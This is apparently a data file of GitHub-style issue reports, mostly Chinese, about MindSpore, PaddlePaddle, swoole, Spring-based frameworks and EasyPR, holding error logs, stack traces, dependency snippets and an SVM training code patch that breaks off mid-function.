[ERROR] DEVICE(73678,fffe8d7fe1e0,python):2021-11-11-17:49:48.502.852 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:570] DumpTaskExceptionInfo] Task fail infos task_id: 73, stream_id: 11, tid: 74570, device_id: 7, retcode: 507011 [ERROR] DEVICE(73678,fffe8d7fe1e0,python):2021-11-11-17:49:48.504.496 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:579] DumpTaskExceptionInfo] Dump node (Gradients/Default/network-WithEvalCell/_network-ECONet/new_fc-Dense/gradBiasAdd/BiasAddGrad-op1958) task error input/output data to: ./task_error_dump/7 trace: In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/_grad/grad_nn_ops.py(39)/ return dout, bias_grad(dout)/ Corresponding forward node candidate: In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/layer/conv.py(263)/ output = self.bias_add(output, self.bias)/ In file /data/hlj/eco1110-1-openpose/src/econet_use_none.py(24)/ x = self.conv2d(x)/ In file /data/hlj/eco1110-1-openpose/src/econet_use_none.py(147)/ x = self.conv3(x)/ In file /data/hlj/eco1110-1-openpose/src/econet_use_none.py(330)/ base_out = self.base_model(input_var)/ In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(112)/ out = self._backbone(data)/ In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py(390)/ loss = self.network(*inputs)/ [ERROR] DEVICE(73678,fffe8d7fe1e0,python):2021-11-11-17:49:49.042.396 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:693] RunTask] RunModel error msg: mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:232 Run] Call rt api rtStreamSynchronize failed, ret: 507011 # In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/_grad/grad_nn_ops.py(64) return dx, dw ^ [ERROR] SESSION(73678,fffe8d7fe1e0,python):2021-11-11-17:49:49.048.216 [mindspore/ccsrc/backend/session/ascend_session.cc:1137] Execute] run task error! Traceback (most recent call last): File ""train_ucf_changelrform_2.py"", line 310, in &lt;module&gt; run_train() File ""train_ucf_changelrform_2.py"", line 155, in run_train dataset_sink_mode=False) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 649, in train sink_size=sink_size) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 433, in _train self._train_process(epoch, train_dataset, list_callback, cb_params) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/train/model.py"", line 558, in _train_process outputs = self._train_network(*next_element) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 386, in __call__ out = self.compile_and_run(*inputs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 660, in compile_and_run return _executor(self, *new_inputs, phase=self.phase) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 611, in __call__ return self.run(obj, *args, phase=phase) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 639, in run return self._exec_pip(obj, *args, phase=phase_real) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 622, in _exec_pip return self._executor(args_list, phase) RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1137 Execute] run task error! # In file /root/archiconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/_grad/grad_nn_ops.py(64) return dx, dw"
Question about the learning rate assignment,"In the demo of sentiment, I see the stack lstm is used for this classification task (this file). I have some questions about the learning rate. In line 105, the is a list, which contains the learning rate of fc_layer and lstm_layer. In line 123, the fc_layer uses the to get the learning rate, but the following lstm does not have a . Then could the second element of the be conveyed to lstm? How?   <code>: para_attr param_attr param_attr para_attr"
rg.tinygroup.springmvc-3.0.0 <>  不能工作,"在使用org.tinygroup.springmvc-3.0.0时 &lt;property-editor bean-name=""customDateRegistrar""&gt; 属性不能正常工作，在org.tinygroup.springmvc-2.3.0中是好的。   <code>: Field error in object 'user' on field 'expireDate': rejected value [2017-01-01]; codes [typeMismatch.user.expireDate,typeMismatch.expireDate,typeMismatch.java.util.Date,typeMismatch]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [user.expireDate,expireDate]; arguments []; default message [expireDate]]; default message [Failed to convert property value of type [java.lang.String] to required type [java.util.Date] for property 'expireDate'; nested exception is java.lang.IllegalStateException: Cannot convert value of type [java.lang.String] to required type [java.util.Date] for property 'expireDate': no matching editors or conversion strategy found]} org.springframework.validation.BindException: org.springframework.validation.BeanPropertyBindingResult: 1 errors Field error in object 'user' on field 'expireDate': rejected value [2017-01-01]; codes [typeMismatch.user.expireDate,typeMismatch.expireDate,typeMismatch.java.util.Date,typeMismatch]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [user.expireDate,expireDate]; arguments []; default message [expireDate]]; default message [Failed to convert property value of type [java.lang.String] to required type [java.util.Date] for property 'expireDate'; nested exception is java.lang.IllegalStateException: Cannot convert value of type [java.lang.String] to required type [java.util.Date] for property 'expireDate': no matching editors or conversion strategy found] at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.doBind(HandlerMethodInvoker.java:826) at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.resolveHandlerArguments(HandlerMethodInvoker.java:374) at org.springframework.web.bind.annotation.support.HandlerMethodInvoker.invokeHandlerMethod(HandlerMethodInvoker.java:175) at org.tinygroup.springmvc.handleradapter.AbstractMethodHandlerAdapter.invokeHandlerMethod(AbstractMethodHandlerAdapter.java:363) at org.tinygroup.springmvc.handleradapter.AbstractMethodHandlerAdapter.handle(AbstractMethodHandlerAdapter.java:345) at org.tinygroup.springmvc.handleradapter.TinyHandlerAdapterComposite.handle(TinyHandlerAdapterComposite.java:96) at org.tinygroup.springmvc.handleradapter.TinyHandlerAdapter.handle(TinyHandlerAdapter.java:78) at org.tinygroup.springmvc.tinyprocessor.SpringMvcTinyProcessor.doDispatch(SpringMvcTinyProcessor.java:355) at org.tinygroup.springmvc.tinyprocessor.SpringMvcTinyProcessor.doService(SpringMvcTinyProcessor.java:289) at org.tinygroup.springmvc.tinyprocessor.SpringMvcTinyProcessor.reallyProcess(SpringMvcTinyProcessor.java:204)"
make test到底重不重要，还有测试脚本有没有问题？,我编译好了无法通过测试，卡在第 33 个测试，前面还有很多 FAIL：   <code>: ===================================================================== TIME START 2017-09-13 09:47:36 ===================================================================== FAIL swoole_async: linux native aio readfile &amp; writefile [tests/swoole_async/aio1.phpt] FAIL swoole_async: linux native aio read [tests/swoole_async/aio2.phpt] FAIL swoole_async: linux native aio write [tests/swoole_async/aio3.phpt] PASS swoole_async: parallel_read_copy_10m_file [tests/swoole_async/parallel_read_copy_10m_file_with_1m_chunk.phpt] PASS swoole_async: parallel_read_copy_10m_file [tests/swoole_async/parallel_read_copy_10m_file_with_512k_chunk.phpt] PASS swoole_async: swoole_async_read [tests/swoole_async/readfile.phpt] PASS swoole_async: recursive write file [tests/swoole_async/recursive_write.phpt] PASS swoole_async: sequence copy 10m file [tests/swoole_async/serial_read_copy_10m_file.phpt] PASS swoole_async: swoole_async_dns_lookup [tests/swoole_async/swoole_async_dns_lookup.phpt] PASS swoole_async: swoole_async_read [tests/swoole_async/swoole_async_read.phpt] PASS swoole_async: swoole_async_set [tests/swoole_async/swoole_async_set.phpt] FAIL swoole_async: swoole_async_write [tests/swoole_async/swoole_async_write.phpt] PASS swoole_async: swoole_async_read [tests/swoole_async/writefile.phpt] PASS swoole_atomic: add/sub/get/cmpset [tests/swoole_atomic/atomic.phpt] PASS swoole_atomic: wakeup &amp; wait [tests/swoole_atomic/wait.phpt] PASS swoole_buffer: read and write swoole_buffer [tests/swoole_buffer/buffer_append.phpt] PASS swoole_buffer: read and write swoole_buffer [tests/swoole_buffer/buffer_clear.phpt] PASS swoole_buffer: read and write swoole_buffer [tests/swoole_buffer/buffer_expand.phpt] PASS swoole_buffer: read and write swoole_buffer [tests/swoole_buffer/buffer_read_write.phpt] PASS swoole_buffer: read and write swoole_buffer [tests/swoole_buffer/buffer_recycle.phpt] PASS swoole_buffer: read and write swoole_buffer [tests/swoole_buffer/buffer_substr.phpt] PASS swoole_buffer: default contruct buffer [tests/swoole_buffer/construct_buffer.phpt] PASS swoole_channel: push &amp; pop &amp; stats [tests/swoole_channel/channel.phpt] FAIL swoole_client: big_package_memory_leak [tests/swoole_client_async/big_package_memory_leak.phpt] FAIL swoole_client: onBufferFull &amp; onBufferEmpty [tests/swoole_client_async/buffer_full.php.phpt] PASS swoole_client: connect refuse [tests/swoole_client_async/connect_refuse.phpt] PASS swoole_client: connect_host_not_found [tests/swoole_client_async/connect_timeout.phpt] PASS swoole_client: connect twice [tests/swoole_client_async/connect_twice.phpt] FAIL swoole_client: getSocket debug [tests/swoole_client_async/getSocket_bug.phpt] PASS swoole_client: getsockpeername [tests/swoole_client_async/getpeername.phpt] FAIL swoole_client: swoole_client getsockname [tests/swoole_client_async/getsockname.phpt] FAIL swoole_client: async sendfile [tests/swoole_client_async/sendfile.phpt] ^Cmake: *** wait: No child processes. Stop._wake.phpt]
forest-spring-boot-starter  1.5.5缺少protobuf-java的jar包,Forest: version Backend: (okhttp或httpclient)/version forest-spring-boot-starter 1.5.5 默认：okhttp 该问题是如何引起的？ 接口定义（必要时请提供） 解决 缺少了jar包，导致的protobuf-java，forest-spring-boot-starter没有将protobuf-java将其打入到starter中。 1.5.6好像还是没有更正啊   <code>: &lt;dependency&gt; &lt;groupId&gt;com.dtflys.forest&lt;/groupId&gt; &lt;artifactId&gt;forest-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.google.protobuf&lt;/groupId&gt; &lt;artifactId&gt;protobuf-java&lt;/artifactId&gt; &lt;version&gt;3.18.1&lt;/version&gt; &lt;/dependency&gt;
Paddle needs better quick start documents,I copy-and-pasted @wwlaoxi's email here:   <code>: 很高兴收到您的回复邮件。下边我将简单的讲述我配置paddlepaddle的过程及其遇到的问题。 由于我先前主要开发基于DSP和FPGA产品的软件，并没有在在ubuntu下使用docker工具的经历，所以希望paddlepaddle的使用教程能类似于“傻瓜相机”一样，可以让我们这些行业的“新手”也能快速上手，真正做到易学易用。这样我才能把时间花费在算法的学习和分析上，而不是想该怎么配置和使用paddlepaddle工具。 硬件配置：CPU: i7 6850k GPU：NVIDIA 1080*1；操作系统：ubuntu 14.04； 初衷是想基于GPU来进行深度学习。下面将简述我的安装过程： a、安装docker b、在paddlepaddle官网上的 新手入门 &gt; 安装与编译 &gt; PaddlePaddle的Docker容器使用方式 中按照 1、安装开发镜像：docker run -it --rm docker.paddlepaddle.org/paddle:0.10.0-dev /bin/bash 2、安装生产镜像：nvidia-docker run -it --rm paddledev/paddle:0.10.0rc1-gpu /bin/bash 上述两个步走骤已完成，后续的没法进行：不知道怎么该怎么使用paddlepaddle来开发程序。 同时我也 执行 nvidia-docker run -d -p 8888:8888 docker.paddlepaddle.org/book:0.10.0-gpu，安装了这本书。 3、运行以及发布您的AI程序：假设您已经完成了一个AI训练的python程序 a.py，这个程序是您在开发机上使用开发镜像完成开发。此时您可以运行这个命令在开发机上进行测试运行。 现在就是卡在这一步了，我不知道如何使用docker中的 PaddlePaddle来开发和完成一个AI训练的python程序，希望咱们的教程中增加这一块内容。这样才会有更多的新人使用 PaddlePaddle工具，不然大部分新人都困在这一步，最后只能是舍弃PaddlePaddle工具（在网上没搜到解决办法）。 从我这个“新手”的角度来看，一个易学易用的开源工具必须有这四点，1）详细的安装流程；2）详细的使用工具的流程，开发程序的流程（用一个例子来说明）；3）详细的分析各种例子（代码）的内容；4）开发者和使用者应有效的沟通和交流，从而促进该工具的能更好的“落地”。从目前PaddlePaddle的官网来看，第3）点做的很好，都是关于深度学习应用的各种例子以及分析。但是第1）和第2）内容一般，尤其是第2）更少。 我的Github账号是wwlaoxi，谢谢您的帮助。
新增微服务，remoteTokenService 空指针,pigx版本: 3.2 操作系统: windows 是否修改包名: 否 此描述属于上述哪个等级: B 新增微服务，用swagger测试时，租户拦截器报错了。   <code>: java.lang.NullPointerException: null at org.springframework.security.oauth2.provider.token.RemoteTokenServices.loadAuthentication(RemoteTokenServices.java:108) ~[spring-security-oauth2-2.3.6.RELEASE.jar:na] at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationManager.authenticate(OAuth2AuthenticationManager.java:83) ~[spring-security-oauth2-2.3.6.RELEASE.jar:na] at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:150) ~[spring-security-oauth2-2.3.6.RELEASE.jar:na] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:74) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) ~[spring-security-web-5.1.5.RELEASE.jar:5.1.5.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:357) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:270) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:114) ~[spring-boot-actuator-2.1.6.RELEASE.jar:2.1.6.RELEASE] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:104) ~[spring-boot-actuator-2.1.6.RELEASE.jar:2.1.6.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:109) ~[spring-web-5.1.8.RELEASE.jar:5.1.8.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at com.pig4cloud.pigx.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:59) ~[classes/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) [undertow-servlet-2.0.21.Final.jar:2.0.21.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:364) [undertow-core-2.0.21.Final.jar:2.0.21.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.21.Final.jar:2.0.21.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_171] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_171] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_171]
PigxRequestGlobalFilter添加“// 3. 支持swagger添加X-Forwarded-Prefix header”导致Swagger路径有个逗号错误,"pigx版本: 2.7.0 操作系统:win7 是否修改包名: 否   <code>: // 3. 支持swagger添加X-Forwarded-Prefix header String path = request.getURI().getPath(); if (!StringUtils.endsWithIgnoreCase(path, SwaggerProvider.API_URI)) { return chain.filter(exchange.mutate().request(newRequest).build()); } String basePath = path.substring(0, path.lastIndexOf(SwaggerProvider.API_URI)); return chain.filter(exchange.mutate() .request(newRequest.mutate() .header(HEADER_NAME, basePath) .build()).build());"
【事件总线】希望可以优化事件总线订阅类的注册,Furion 版本号 2.20.1 Web 项目类型 WebApi 针对事件总线的注册部分代码，希望能进行一下优化，我现在订阅者有点多..... 然后后面可能还会更多，所以这块希望大佬能帮忙处理下。 现在的代码： 无错误~ 无测试代码~ Sqlite 希望能精简一下，或者大佬能告诉下还有其他什么写法.... 期望效果： 关注 Furion 你给的 star，胜过所有读过的诗。   <code>: buidler.AddSubscriber&lt;MqttEventHandler&gt;() .AddSubscriber&lt;MqttDeviceHandler&gt;() .AddSubscriber&lt;TcpEventHandler&gt;() .AddSubscriber&lt;UdpEventHandler&gt;() // ................ ; buidler.AddSubscriber&lt;某个接口？&gt;() 或者 buidler.AddSubscriber&lt;某个父类？&gt;()
在svm训练的时候，老是有异常抛出，最后发现是在svm训练的时候需要手动创建.svm的子目录，感觉比较麻烦而且不自动，对代码进行修改里一下，提一个思路，望版主改善。,"修改文件：EasyPR/src/train/svm_train.cpp 修改函数：Svm::train 修改注释：add by sunjc for svm file output 2015-12-1 修改后的代码如下：   <code>: /**add by sunjc for svm file output 2015-12-1*/ #define OUT_SVM_PATH_LEN 128 /**end add by sunjc for svm file output 2015-12-1*/ void Svm::train(bool divide /* = true */, float divide_percentage /* = 0.7 */, bool train /* = true */, const char* out_svm_path /* = NULL */) { /**add by sunjc for svm file output 2015-12-1*/ char out_svm_file[OUT_SVM_PATH_LEN]={0}; /**end add by sunjc for svm file output 2015-12-1*/ if (out_svm_path == NULL) { out_svm_path = ""resources/model""; } /**add by sunjc for svm file output 2015-12-1*/ sprintf(out_svm_file,""%s/svm.xml"",out_svm_path); /**end add by sunjc for svm file output 2015-12-1*/ if (divide) { std::cout &lt;&lt; ""Dividing data to be trained and tested..."" &lt;&lt; std::endl; this-&gt;divide(forward_, divide_percentage); this-&gt;divide(inverse_, divide_percentage); } CvSVM svm; // 70% training procedure if (train) { this-&gt;get_train(); if (!this-&gt;classes_.empty() &amp;&amp; !this-&gt;trainingData_.empty()) { // need to be trained first CvSVMParams SVM_params; SVM_params.svm_type = CvSVM::C_SVC; // SVM_params.kernel_type = CvSVM::LINEAR; //CvSVM::LINEAR; // 线型，也就是无核 SVM_params.kernel_type = CvSVM::RBF; // CvSVM::RBF 径向基函数，也就是高斯核 SVM_params.degree = 0.1; SVM_params.gamma = 1; SVM_params.coef0 = 0.1; SVM_params.C = 1; SVM_params.nu = 0.1; SVM_params.p = 0.1; SVM_params.term_crit = cvTermCriteria(CV_TERMCRIT_ITER, 100000, 0.0001); std::cout &lt;&lt; ""Generating svm model file, please wait..."" &lt;&lt; std::endl; try { // CvSVM svm(trainingData, classes, cv::Mat(), cv::Mat(), SVM_params); svm.train_auto(this-&gt;trainingData_, this-&gt;classes_, cv::Mat(), cv::Mat(), SVM_params, 10, CvSVM::get_default_grid(CvSVM::C), CvSVM::get_default_grid(CvSVM::GAMMA), CvSVM::get_default_grid(CvSVM::P), CvSVM::get_default_grid(CvSVM::NU), CvSVM::get_default_grid(CvSVM::COEF), CvSVM::get_default_grid(CvSVM::DEGREE), true); } catch (const cv::Exception&amp; err) { std::cout &lt;&lt; err.what() &lt;&lt; std::endl; } utils::mkdir(out_svm_path); //cv::FileStorage fsTo(out_svm_path, cv::FileStorage::WRITE); /**add by sunjc for svm file output 2015-12-1*/ cv::FileStorage fsTo(out_svm_file, cv::FileStorage::WRITE); svm.write(*fsTo, ""svm""); std::cout &lt;&lt; ""Generate done! The model file is located at "" &lt;&lt; out_svm_file &lt;&lt; std::endl; /**end add by sunjc for out svm file 2015-12-1*/ } /**delete by sunjc for out svm file 2015-12-1*/ /*else { // don't train, use ready-made model file try { svm.load(""resources/train/svm.xml"", ""svm""); } catch (const cv::Exception&amp; err) { std::cout &lt;&lt; err.what() &lt;&lt; std::endl; } } */ /**end delete by sunjc for out svm file 2015-12-1*/ } // if train // TODO Check whether the model file exists or not. /**add by sunjc for svm file output 2015-12-1*/ //svm.load(out_svm_path, ""svm""); // make sure svm model was loaded try { svm.load(out_svm_file, ""svm""); } catch (const cv::Exception&amp; err) { std::cout &lt;&lt; err.what() &lt;&lt; std::endl; } /**end add by sunjc for svm file output 2015-12-1*/ // 30% testing procedure this-&gt;get_test(); std::cout &lt;&lt; ""Testing..."" &lt;&lt; std::endl; double count_all = test_imgaes_.size(); double ptrue_rtrue = 0; double ptrue_rfalse = 0; double pfalse_rtrue = 0; double pfalse_rfalse = 0; size_t label_index = 0; for (auto image : test_imgaes_) { //调用回调函数决定特征 auto features = easypr::histeq(image); features = features.reshape(1, 1); cv::Mat out; features.convertTo(out, CV_32FC1); Label predict = ((int)svm.predict(out)) == 1 ? kForward : kInverse; Label real = test_labels_[label_index++]; if (predict == kForward &amp;&amp; real == kForward) ptrue_rtrue++; if (predict == kForward &amp;&amp; real == kInverse) ptrue_rfalse++; if (predict == kInverse &amp;&amp; real == kForward) pfalse_rtrue++; if (predict == kInverse &amp;&amp; real == kInverse) pfalse_rfalse++; } std::cout &lt;&lt; ""count_all: "" &lt;&lt; count_all &lt;&lt; std::endl; std::cout &lt;&lt; ""ptrue_rtrue: "" &lt;&lt; ptrue_rtrue &lt;&lt; std::endl; std::cout &lt;&lt; ""ptrue_rfalse: "" &lt;&lt; ptrue_rfalse &lt;&lt; std::endl; std::cout &lt;&lt; ""pfalse_rtrue: "" &lt;&lt; pfalse_rtrue &lt;&lt; std::endl; std::cout &lt;&lt; ""pfalse_rfalse: "" 